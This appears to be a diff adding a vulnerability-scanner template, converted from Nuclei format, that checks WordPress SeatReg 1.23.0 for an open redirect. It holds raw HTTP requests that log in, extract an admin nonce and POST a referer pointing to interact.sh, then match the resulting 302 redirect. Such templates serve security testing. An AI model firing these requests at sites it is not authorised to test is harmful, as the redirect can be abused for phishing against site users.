@@ -1,0 +1,135 @@
+{
+  "id": "seatreg-redirect",
+  "name": "WordPress Plugin ‘SeatReg’  - Open Redirect",
+  "author": "Mariam Tariq",
+  "severity": "MEDIUM",
+  "description": "WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.\n",
+  "references": [
+    "https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html"
+  ],
+  "tags": [
+    "redirect",
+    "packetstorm",
+    "seatreg",
+    "wp-plugin",
+    "wp",
+    "wordpress",
+    "authenticated"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\u0026testcookie\u003d1\n",
+        "GET /wp-admin/admin.php?page\u003dseatreg-welcome HTTP/1.1\nHost: {{Hostname}}\n",
+        "POST /wp-admin/admin-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew-registration-name\u003dtest\u0026action\u003dseatreg_create_submit\u0026seatreg-admin-nonce\u003d{{seatreg-admin-nonce}}\u0026_wp_http_referer\u003dhttp://interact.sh\u0026submit\u003dCreate+new+registration\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_3 \u003d\u003d 302",
+            "contains(header_3, \u0027http://interact.sh\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "seatreg-redirect",
+    "info": {
+      "name": "WordPress Plugin ‘SeatReg’  - Open Redirect",
+      "author": "Mariam Tariq",
+      "severity": "medium",
+      "description": "WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.\n",
+      "reference": [
+        "https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html"
+      ],
+      "metadata": {
+        "max_request": 3
+      },
+      "tags": "redirect,packetstorm,seatreg,wp-plugin,wp,wordpress,authenticated"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\u0026testcookie\u003d1\n",
+          "GET /wp-admin/admin.php?page\u003dseatreg-welcome HTTP/1.1\nHost: {{Hostname}}\n",
+          "POST /wp-admin/admin-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew-registration-name\u003dtest\u0026action\u003dseatreg_create_submit\u0026seatreg-admin-nonce\u003d{{seatreg-admin-nonce}}\u0026_wp_http_referer\u003dhttp://interact.sh\u0026submit\u003dCreate+new+registration\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_3 \u003d\u003d 302",
+              "contains(header_3, \u0027http://interact.sh\u0027)"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"seatreg\\-admin\\-nonce\" value\u003d\"([0-9a-z]+)\""
+            ],
+            "group": 1,
+            "name": "seatreg-admin-nonce",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
